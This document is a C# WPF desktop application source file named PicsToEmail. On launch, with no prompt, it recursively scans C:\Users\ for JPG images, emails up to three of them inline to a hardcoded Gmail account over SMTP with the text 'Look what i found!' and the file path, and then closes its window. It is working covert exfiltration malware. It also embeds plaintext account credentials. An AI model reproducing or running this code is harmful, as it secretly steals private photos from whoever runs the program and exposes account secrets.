using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net.Mail;
using System.IO;

namespace PicsToEmail
{

    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            var client = new SmtpClient();
            client.Port = 587;
            client.Host = "smtp.gmail.com";
            client.EnableSsl = true;
            client.Timeout = 10000;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            // client.Credentials = new System.Net.NetworkCredential("Your Email Here", "Your Password Here");
            client.Credentials = new System.Net.NetworkCredential("crypto17sce@gmail.com", "crypto17sce1");

            int count = 0;
            foreach (string fileName in EnumerateFiles(@"C:\Users\", "*.jpg", SearchOption.AllDirectories))
            {
                if(count < 3)
                {
                    MailMessage newMail = new MailMessage("crypto17sce@gmail.com", "crypto17sce@gmail.com", "test", "test");

                    //MailMessage newMail = new MailMessage("From", "To", "Subject", "Body");


                    newMail.Subject = "Test Subject";
                    newMail.IsBodyHtml = true;

                    var inlineLogo = new LinkedResource(fileName);
                    inlineLogo.ContentId = Guid.NewGuid().ToString();
                    string body = string.Format(@"<p>Look what i found!</p><img src=""cid:{0}"" />" + fileName, inlineLogo.ContentId);

                    var view = AlternateView.CreateAlternateViewFromString(body, null, "text/html");
                    view.LinkedResources.Add(inlineLogo);
                    newMail.AlternateViews.Add(view);

                    newMail.BodyEncoding = UTF8Encoding.UTF8;
                    newMail.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;

                    client.Send(newMail);

                    count++;
                }
                else break;
            }
            this.Close();
        }


        public static IEnumerable<string> EnumerateDirectories(string parentDirectory, string searchPattern, SearchOption searchOpt)
        {
            try
            {
                var directories = Enumerable.Empty<string>();
                if (searchOpt == SearchOption.AllDirectories)
                {
                    directories = Directory.EnumerateDirectories(parentDirectory)
                        .SelectMany(x => EnumerateDirectories(x, searchPattern, searchOpt));
                }
                return directories.Concat(Directory.EnumerateDirectories(parentDirectory, searchPattern));
            }
            catch (UnauthorizedAccessException ex)
            {
                return Enumerable.Empty<string>();
            }
        }

        public static IEnumerable<string> EnumerateFiles(string path, string searchPattern, SearchOption searchOpt)
        {
            try
            {
                var dirFiles = Enumerable.Empty<string>();
                if (searchOpt == SearchOption.AllDirectories)
                {
                    dirFiles = Directory.EnumerateDirectories(path)
                                        .SelectMany(x => EnumerateFiles(x, searchPattern, searchOpt));
                }
                return dirFiles.Concat(Directory.EnumerateFiles(path, searchPattern));
            }
            catch (UnauthorizedAccessException ex)
            {
                return Enumerable.Empty<string>();
            }
        }

    }
   
}
